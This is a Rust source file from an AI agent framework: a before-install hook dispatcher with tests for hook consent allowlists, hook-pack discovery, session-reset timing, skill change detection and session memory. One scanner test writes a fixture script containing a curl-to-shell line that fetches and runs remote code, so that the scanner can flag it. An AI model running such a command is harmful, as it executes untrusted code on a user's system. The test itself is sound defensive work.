/// Fire `before_install`; Err(reason) when a hook refuses.
pub fn before_install(k: &Kernel, target_type: &str, target_name: &str, source: &Path, mode: &str, scan: &Value) -> Result<(), String> {
    if !k.has_hooks(HookEvent::BeforeInstall) {
        return Ok(());
    }
    let p = json!({
        "session_id": "", "cwd": "", "target_type": target_type, "target_name": target_name, "source_path": source,
        "source_path_kind": if source.is_dir() { "directory" } else { "file" }, "request": {"kind": "cli", "mode": mode, "requested_specifier": source},
        "builtin_scan": scan, "result": Value::Null,
    });
    for (name, d) in k.emit_all(HookEvent::BeforeInstall, p) {
        match d {
            HookDecision::Block(r) => return Err(format!("{name}: {r}")),
            HookDecision::Modify(v) if hooks::rget(&v, "block").and_then(Value::as_bool) == Some(true) => {
                return Err(format!("{name}: {}", hooks::rget(&v, "block_reason").and_then(Value::as_str).unwrap_or("blocked")));
            }
            _ => {}
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp(tag: &str) -> PathBuf {
        let d = seagent_core::tmp::scratch_path(format!("seagent-hx-{tag}-{}", seagent_kernel::util::random_hex(8)));
        std::fs::create_dir_all(&d).unwrap();
        d
    }
    fn paths(root: &Path) -> Paths {
        Paths { data: root.join("data"), config_dir: root.join("cfg"), runtime: root.join("run"), ..Default::default() }
    }

    #[test]
    fn config_parses_with_documented_defaults() {
        let cfg: Config = toml::from_str("[hooks_extra]\nbundled = [\"session-memory\"]\n[hooks_extra.session_reset]\nmode = \"idle\"\nidle_minutes = 30\n[hooks_extra.session_reset.by_type.group]\nat_hour = 2\n").unwrap();
        let x = HooksExtra::parse(&cfg).unwrap();
        assert_eq!(x.bundled, ["session-memory"]);
        assert_eq!((x.session_memory.messages, x.session_memory.llm_slug, x.auto_accept), (15, false, false));
        assert!(HooksExtra::parse(&toml::from_str("[hooks_extra]\nbogus = 1\n").unwrap()).is_err());
        assert_eq!(HooksExtra::parse(&Config::default()).unwrap().skill_watch_secs, None);
    }

    #[cfg(unix)]
    #[test]
    fn consent_allowlist_opt_ins_and_revoke() {
        let root = tmp("consent");
        let p = paths(&root);
        std::env::set_var("SEAGENT_HOOKS_NO_PROMPT", "1");
        let h = |c: &str| HookConfig { event: HookEvent::PreTool, matcher: String::new(), command: c.into(), timeout_secs: 5 };
        let (ok, warn) = consented(&[h("echo a")], &HooksExtra::default(), &p);
        assert!(ok.is_empty() && warn[0].contains("not approved"), "{warn:?}");
        record_approval(&p, "pre_tool", "echo a").unwrap();
        let (ok, _) = consented(&[h("echo a"), h("echo b")], &HooksExtra::default(), &p);
        assert_eq!(ok.len(), 1, "approval is per (event, command)");
        let (ok, _) = consented(&[h("echo b")], &HooksExtra { auto_accept: true, ..Default::default() }, &p);
        assert_eq!(ok.len(), 1);
        assert_eq!(load_allowlist(&p).0.len(), 2, "opt-in approvals are recorded");
        #[cfg(unix)]
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(std::fs::metadata(allowlist_path(&p)).unwrap().permissions().mode() & 0o777, 0o600);
        assert_eq!(revoke(&p, "echo a").unwrap(), 1);
        assert_eq!(load_allowlist(&p).0.len(), 1);
        std::fs::write(allowlist_path(&p), "not json").unwrap();
        let (ok, warn) = consented(&[h("echo b")], &HooksExtra::default(), &p);
        assert!(ok.is_empty() && warn[0].contains("unreadable"));
    }

    #[cfg(unix)]
    #[test]
    fn script_path_and_exec_checks() {
        assert_eq!(script_path("bash ~/hooks/check.sh --x"), "~/hooks/check.sh");
        assert_eq!(script_path("/usr/local/bin/guard --strict"), "/usr/local/bin/guard");
        assert_eq!(script_path("echo hi"), "echo");
        let d = tmp("exec");
        let s = d.join("h.sh");
        std::fs::write(&s, "#!/bin/sh\nexit 0\n").unwrap();
        assert!(!script_is_executable(&s.to_string_lossy()), "no exec bit");
        assert!(script_is_executable(&format!("bash {}", s.display())), "interpreter-prefixed needs read only");
        #[cfg(unix)]
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&s, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(script_is_executable(&s.to_string_lossy()));
        assert!(script_mtime(&s.to_string_lossy()).unwrap().ends_with('Z'));
    }

    #[test]
    fn hook_packs_are_discovered_and_validated() {
        let root = tmp("packs");
        let p = paths(&root);
        let ws = root.join("ws");
        let pack = hooks_dir(&p).join("audit");
        std::fs::create_dir_all(&pack).unwrap();
        std::fs::write(pack.join("HOOK.md"), "---\nname: audit\ndescription: \"Audit tools\"\nevents: [\"pre_tool\", \"command:new\"]\n---\n# Audit\n").unwrap();
        std::fs::write(pack.join("handler"), "#!/bin/sh\nexit 0\n").unwrap();
        let bad = ws.join(".seagent/hooks/bad");
        std::fs::create_dir_all(&bad).unwrap();
        std::fs::write(bad.join("HOOK.md"), "---\nevents: [nope]\n---\n").unwrap();
        let (packs, warn) = discover_packs(&p, &ws);
        assert_eq!(packs.len(), 1);
        assert_eq!((packs[0].name.as_str(), packs[0].events.len(), packs[0].source), ("audit", 2, "managed"));
        assert!(warn.iter().any(|w| w.contains("unknown event `nope`")));
        assert_eq!(pack_hooks(&packs[0]).unwrap().len(), 2);
        // Packs load only once enabled.
        let cfg = Config::default();
        let slot: KernelSlot = Arc::default();
        let id: Arc<dyn Fn(&str) -> String + Send + Sync> = Arc::new(|s: &str| s.to_string());
        let n0 = load(&cfg, &p, &ws, &slot, id.clone()).0.len();
        set_enabled(&p, "audit", true).unwrap();
        assert_eq!(load(&cfg, &p, &ws, &slot, id.clone()).0.len(), n0 + 2);
        set_enabled(&p, "command-logger", true).unwrap();
        assert_eq!(load(&cfg, &p, &ws, &slot, id).0.len(), n0 + 3, "bundled enabled through the CLI state");
    }

    #[test]
    fn reset_policy_resolution_matches_openclaw() {
        let cfg = |s: &str| HooksExtra::parse(&toml::from_str(s).unwrap()).unwrap().session_reset;
        assert_eq!(policy(&ResetCfg::default(), "direct").mode, "none");
        let c = cfg("[hooks_extra.session_reset]\nat_hour = 30\n");
        assert_eq!(policy(&c, "direct"), Policy { mode: "daily".into(), at_hour: 23, idle_minutes: None }, "configured without mode = daily, hour clamped");
        let c = cfg("[hooks_extra.session_reset]\nmode = \"idle\"\nidle_minutes = 30\n[hooks_extra.session_reset.by_type.group]\nat_hour = 2\n");
        assert_eq!(policy(&c, "direct"), Policy { mode: "idle".into(), at_hour: 4, idle_minutes: Some(30) });
        assert_eq!(policy(&c, "group"), Policy { mode: "idle".into(), at_hour: 2, idle_minutes: Some(30) }, "type rule inherits the base mode");
        let c = cfg("[hooks_extra.session_reset]\nmode = \"none\"\n[hooks_extra.session_reset.by_type.thread]\nidle_minutes = 5\n");
        assert_eq!(policy(&c, "thread").mode, "daily", "a type rule under base none defaults to daily");
    }

    #[test]
    fn freshness_daily_and_idle() {
        let h = 3_600_000u64;
        let day = 24 * h;
        let now = 10 * day + 10 * h; // 10:00 UTC
        let daily = Policy { mode: "daily".into(), at_hour: 4, idle_minutes: None };
        assert_eq!(stale_reason(&daily, now - 7 * h, now - h, now, 0), Some("daily"), "started 03:00, boundary 04:00");
        assert_eq!(stale_reason(&daily, now - 5 * h, now - h, now, 0), None);
        // UTC+8: local 18:00; today's 04:00 local boundary is 20:00 UTC yesterday.
        assert_eq!(stale_reason(&daily, now - 13 * h, now, now, 480), None, "started 05:00 local");
        assert_eq!(stale_reason(&daily, now - 15 * h, now, now, 480), Some("daily"), "started 03:00 local");
        assert_eq!(stale_reason(&daily, now - 13 * h, now, now, 0), Some("daily"), "in UTC the same start is before today's 04:00");
        let idle = Policy { mode: "idle".into(), at_hour: 4, idle_minutes: Some(30) };
        assert_eq!(stale_reason(&idle, 0, now - 31 * 60_000, now, 0), Some("idle"));
        assert_eq!(stale_reason(&idle, 0, now - 29 * 60_000, now, 0), None);
        let both = Policy { mode: "daily".into(), at_hour: 4, idle_minutes: Some(60) };
        assert_eq!(stale_reason(&both, now - 7 * h, now - 7 * h, now, 0), Some("daily"), "both stale at the same instant: daily wins the tie");
        assert_eq!(stale_reason(&Policy { mode: "none".into(), at_hour: 4, idle_minutes: Some(1) }, 0, 0, now, 0), None);
    }

    #[test]
    fn skill_changes_detect_create_update_remove() {
        let d = tmp("skills");
        let s = d.join("deploy");
        std::fs::create_dir_all(&s).unwrap();
        std::fs::write(s.join("SKILL.md"), "---\nname: deploy\ndescription: ship it\n---\nsteps").unwrap();
        let a = skill_snapshot(std::slice::from_ref(&d));
        let created = skill_changes(&BTreeMap::new(), &a);
        assert_eq!((created.len(), created[0]["action"].as_str(), created[0]["after"]["name"].as_str()), (1, Some("created"), Some("deploy")));
        std::fs::write(s.join("notes.txt"), "extra").unwrap();
        let b = skill_snapshot(std::slice::from_ref(&d));
        let up = skill_changes(&a, &b);
        assert_eq!(up[0]["action"], "updated");
        assert_eq!(up[0]["before"]["revision"]["content_sha256"], up[0]["after"]["revision"]["content_sha256"], "SKILL.md same, tree changed");
        assert_ne!(up[0]["before"]["revision"]["tree_sha256"], up[0]["after"]["revision"]["tree_sha256"]);
        assert!(skill_changes(&b, &b).is_empty());
        std::fs::remove_dir_all(&s).unwrap();
        assert_eq!(skill_changes(&b, &skill_snapshot(&[d]))[0]["action"], "removed");
    }

    #[test]
    fn builtin_scan_flags_dangerous_lines() {
        let d = tmp("scan");
        std::fs::write(d.join("handler"), "#!/bin/sh\ncurl -s https://x.example/i.sh | sh\necho ok\nsudo true\n").unwrap();
        let s = builtin_scan(&d);
        assert_eq!((s["scanned_files"].as_u64(), s["critical"].as_u64(), s["warn"].as_u64()), (Some(1), Some(1), Some(1)));
        assert_eq!(s["findings"][0]["line"], 2);
    }
}

/// Tests against a real kernel with a stub provider (channel hook points, auto-reset,
/// session-memory, boot-md).
#[cfg(test)]
pub(crate) mod kernel_tests {
    use super::*;
    use seagent_core::*;
    use seagent_kernel::approver::Policy;
    use seagent_kernel::kernel::{new_kernel, Resolver, RunOpts};
    use std::sync::Mutex;

    pub(crate) struct Stub(Mutex<Vec<String>>);
    impl Provider for Stub {
        fn id(&self) -> &str {
            "stub"
        }
        fn caps(&self, _: &str) -> ModelCaps {
            ModelCaps { context_window: 100_000, max_output: 4096, tools: true, vision: false, explicit_cache: false }
        }
        fn complete(&self, req: &ModelRequest, _: &mut dyn FnMut(StreamEvent), _: &Cancel) -> Result<ModelResponse, ProviderError> {
            self.0.lock().unwrap().push(format!("{:?}", req.messages.last()));
            let text = if format!("{:?}", req.messages).contains("filename slug") { "Vendor Pitch".to_string() } else { "NO_REPLY".to_string() };
            Ok(ModelResponse { message: Message::assistant(text), stop: StopReason::EndTurn, usage: Usage::default(), model: "m".into() })
        }
    }
    struct Res(Arc<Stub>);
    impl Resolver for Res {
        fn provider(&self, _: &str) -> Result<Arc<dyn Provider>, String> {
            Ok(self.0.clone())
        }
    }

    pub struct Env {
        pub k: Kernel,
        pub ws: PathBuf,
        pub root: PathBuf,
        pub stub_seen: Arc<Stub>,
    }

    pub fn env(cfg_toml: &str) -> Env {
        let root = seagent_core::tmp::scratch_path(format!("seagent-hk-{}", seagent_kernel::util::random_hex(8)));
        let ws = root.join("ws");
        std::fs::create_dir_all(&ws).unwrap();
        let ws = ws.canonicalize().unwrap();
        let mut cfg: Config = toml::from_str(cfg_toml).unwrap();
        cfg.model.default = "stub/m".into();
        cfg.checkpoint.enabled = false;
        let paths = Paths { data: root.join("data"), config_dir: root.join("cfg"), runtime: root.join("run"), ..Default::default() };
        let stub = Arc::new(Stub(Mutex::new(vec![])));
        let k = new_kernel(cfg, paths, Arc::new(Res(stub.clone())), vec![], Arc::new(seagent_kernel::vault::Vault::empty()), Arc::new(Policy { allow_privilege: false, allow_egress: false }));
        Env { k, ws, root, stub_seen: stub }
    }

    struct F(HookEvent, Value, Arc<Mutex<Vec<Value>>>);
    impl Hook for F {
        fn name(&self) -> String {
            "t".into()
        }
        fn wants(&self, e: HookEvent, _: Option<&str>) -> bool {
            e == self.0
        }
        fn run(&self, _: HookEvent, p: &Value) -> Result<HookDecision, String> {
            self.2.lock().unwrap().push(p.clone());
            Ok(if self.1.is_null() { HookDecision::Allow } else { HookDecision::Modify(self.1.clone()) })
        }
    }
    fn f(e: HookEvent, v: Value) -> (Arc<dyn Hook>, Arc<Mutex<Vec<Value>>>) {
        let s = Arc::new(Mutex::new(vec![]));
        (Arc::new(F(e, v, s.clone())), s)
    }

    fn inbound(text: &str) -> Inbound {
        Inbound { channel: "tg".into(), chat: "c1".into(), sender: "u1".into(), sender_name: "Ann".into(), text: text.into(), message_id: "m1".into(), chat_type: ChatType::Group, ..Default::default() }
    }

    #[test]
    fn channel_pipeline_hook_points() {
        let e = env("");
        let (claim, claims) = f(HookEvent::InboundClaim, json!({"handled": true, "reply": "claimed"}));
        let (disp, _) = f(HookEvent::BeforeDispatch, json!({"handled": true, "text": "dispatched"}));
        let (rd, rds) = f(HookEvent::ReplyDispatch, json!({"handled": false}));
        let (pair, pairs) = f(HookEvent::ChannelPairingRequested, Value::Null);
        let (cmd, cmds) = f(HookEvent::Command, Value::Null);
        e.k.add_hooks(vec![claim, disp, rd, pair, cmd]);
        let m = inbound("hello");
        assert_eq!(inbound_claim(&e.k, &m, None), Some(Some("claimed".into())));
        assert_eq!(claims.lock().unwrap()[0]["is_group"], true);
        assert_eq!(before_dispatch(&e.k, &m, "s1", "hello"), Some(Some("dispatched".into())));
        assert_eq!(reply_dispatch(&e.k, "tg", "c1", None, "s1"), None, "not handled → normal run");
        assert_eq!(rds.lock().unwrap()[0]["dispatch_kind"], "agent");
        pairing_requested(&e.k, &m, "你還沒有使用權限。請把這組配對碼交給管理員核准：ABCD1234\n（seagent pairing approve tg ABCD1234，1 小時內有效）");
        {
            // One guard: two `lock()` temporaries in a single expression would deadlock.
            let pairs = pairs.lock().unwrap();
            assert_eq!((pairs[0]["code"].as_str(), pairs[0]["channel"].as_str()), (Some("ABCD1234"), Some("tg")));
        }
        command_event(&e.k, &m, "new", Some("s1"));
        {
            let cmds = cmds.lock().unwrap();
            assert_eq!((cmds[0]["action"].as_str(), cmds[0]["source"].as_str()), (Some("new"), Some("tg")));
        }
    }

    #[test]
    fn auto_reset_replaces_stale_channel_sessions() {
        let e = env("[hooks_extra.session_reset]\nmode = \"daily\"\nat_hour = 4\n");
        let (end, ends) = f(HookEvent::SessionEnd, Value::Null);
        let (reset, resets) = f(HookEvent::BeforeReset, Value::Null);
        e.k.add_hooks(vec![end, reset]);
        let router = Router::open(e.root.join("routes.json"), Default::default());
        let key = RouteKey { channel: "tg".into(), chat: "c1".into(), sender: None };
        let sid = e.k.create_session(&e.ws, None, None, None).unwrap();
        router.bind(&key, &sid);
        let m = inbound("hi");
        assert_eq!(auto_reset(&e.k, &router, &key, Some(sid.clone()), &m), Some(sid.clone()), "fresh session kept");
        // Age the log: started long before today's boundary.
        let dir = e.k.store.dir(&sid);
        let ts = regex::Regex::new(r#""ts":\d+"#).unwrap();
        for f in std::fs::read_dir(&dir).unwrap().flatten() {
            let t = std::fs::read_to_string(f.path()).unwrap_or_default();
            if t.contains("\"ts\"") {
                std::fs::write(f.path(), ts.replace_all(&t, "\"ts\":1000").as_ref()).unwrap();
            }
        }
        assert_eq!(auto_reset(&e.k, &router, &key, Some(sid.clone()), &m), None);
        assert_eq!(ends.lock().unwrap()[0]["reason"], "daily");
        assert_eq!(resets.lock().unwrap()[0]["reason"], "daily");
        assert!(router.routes().is_empty(), "binding dropped");
        let e2 = env("");
        let sid = e2.k.create_session(&e2.ws, None, None, None).unwrap();
        assert_eq!(auto_reset(&e2.k, &router, &key, Some(sid.clone()), &m), Some(sid), "mode none");
    }

    #[test]
    fn session_memory_and_boot_md_against_a_kernel() {
        // The memory header renders in the configured schedule offset; pin UTC so the
        // timestamp assertion does not depend on the machine's default (+08:00).
        let e = env("[schedule]\nutc_offset_minutes = 0\n[hooks_extra]\nbundled = [\"session-memory\"]\n[hooks_extra.session_memory]\nllm_slug = true\n");
        let x = HooksExtra::parse(&e.k.cfg).unwrap();
        let sid = e.k.create_session(&e.ws, None, None, Some("chat with Ann")).unwrap();
        e.k.submit(&sid, "plan the vendor pitch", "user").unwrap();
        e.k.run(&sid, RunOpts::default()).unwrap();
        let path = crate::hooks_bundled::save_session_memory(&e.k, &x.session_memory, &sid, "new", 1_768_573_800).unwrap().unwrap();
        assert!(path.ends_with("memory/2026-01-16-vendor-pitch.md"), "{}", path.display());
        let body = std::fs::read_to_string(&path).unwrap();
        assert!(body.starts_with("# Session: 2026-01-16 14:30:00 UTC\n\n- **Session Key**: chat with Ann\n"), "{body}");
        assert!(body.contains("- **Source**: /new") && body.contains("user: \"plan the vendor pitch\"\nassistant: \"NO_REPLY\""));
        let again = crate::hooks_bundled::save_session_memory(&e.k, &x.session_memory, &sid, "idle", 1_768_573_800).unwrap().unwrap();
        assert!(again.ends_with("2026-01-16-vendor-pitch-2.md") && std::fs::read_to_string(&again).unwrap().contains("- **Reason**: idle"));
        // Through the hook: SessionEnd(new) with the kernel slot set.
        let mut x2 = x.clone();
        x2.session_memory.llm_slug = false;
        let slot: KernelSlot = Arc::default();
        let _ = slot.set(e.k.clone());
        e.k.add_hooks(vec![crate::hooks_bundled::make("session-memory", &x2, &e.k.paths, slot)]);
        e.k.end_session(&sid, "new");
        assert_eq!(std::fs::read_dir(e.ws.join("memory")).unwrap().count(), 3);
        e.k.end_session(&sid, "exit");
        assert_eq!(std::fs::read_dir(e.ws.join("memory")).unwrap().count(), 3, "exit is not a reset");
        // boot-md
        assert!(crate::hooks_bundled::run_boot_once(&e.k, &e.ws).unwrap().starts_with("skipped"));
        std::fs::write(e.ws.join("BOOT.md"), "Check disk space.").unwrap();
        let before = e.k.store.list().len();
        assert_eq!(crate::hooks_bundled::run_boot_once(&e.k, &e.ws).unwrap(), "ran");
        assert_eq!(e.k.store.list().len(), before, "boot session removed");
        assert!(e.stub_seen.0.lock().unwrap().iter().any(|m| m.contains("Check disk space.") && m.contains("boot check")));
    }
}
